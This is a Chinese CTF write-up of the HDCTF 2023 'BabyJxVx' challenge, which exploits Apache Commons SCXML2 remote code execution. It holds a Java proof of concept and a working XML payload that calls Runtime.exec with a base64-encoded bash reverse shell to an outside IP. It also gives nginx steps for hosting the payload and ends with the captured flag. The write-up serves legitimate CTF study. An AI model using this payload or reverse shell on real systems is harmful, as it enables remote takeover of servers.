# [HDCTF 2023]BabyJxVx 复现

## 知识点

>   Apache SCXML2 RCE	可以通过加载恶意xml文件实现RCE

>   主要加载恶意xml方式：`SCXMLReader.read()`方法

```java

import org.apache.commons.scxml2.SCXMLExecutor;
import org.apache.commons.scxml2.io.SCXMLReader;
import org.apache.commons.scxml2.model.ModelException;
import org.apache.commons.scxml2.model.SCXML;

import javax.xml.stream.XMLStreamException;
import java.io.IOException;

public class POC {
    public static void main(String[] args) throws ModelException, XMLStreamException, IOException {

        // 创建 scxml 实例
        SCXMLExecutor executor = new SCXMLExecutor();
        // 将 SCXML URL 解析为 SCXML 模型
        SCXML scxml = SCXMLReader.read("http://127.0.0.1:8000/1.xml");

        // 设置状态机（scxml实例）执行
        executor.setStateMachine(scxml);
        executor.go();

    }
}
```

参考文章：https://www.yuque.com/boogipop/okvgcs/zzx3n35xsg26ss0e?view=doc_embed

**playload：**

```xml
<?xml version="1.0"?>
<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0" initial="run">
    <final id="run">
        <onexit>
            <assign location="flag" expr="''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTIuMTI0LjUyLjIwMC8yMDAwMCAwPiYx}|{base64,-d}|{bash,-i}')"/>
        </onexit>
    </final>
</scxml>
```

>   将上面的文件放在服务器上，并设置对外可访问

```nginx
设置服务器文件对外开放方法：
	# 阿里云轻量级服务器方法
	1、防火墙开放端口
	2、服务器中开放端口
	3、添加nginx配置
		cd /etc/nginx/sites-enabled/		
	4、vim test.conf
	# 输入以下
    server {
        listen 9999;
        listen [::]:9999;

        server_name 112.124.52.200;

        location / {
            root /var/www/expose;

        }
    }
	5、测试语法正确然后重新加载配置文件
	nginx -t
	systemctl reload nginx.service
```



>   原题访问：`http://node4.anna.nssctf.cn:28045/Flag?filename=http://服务器地址:7777/poc.xml`
>
>   服务器开启端口监听，触发shell，输入命令获取flag

```nginx
root@4d0d39411c944bf6:/# cat /flag_*
cat /flag_*
NSSCTF{51e9c540-eb7d-4349-8ee0-c83c995cba99}
```

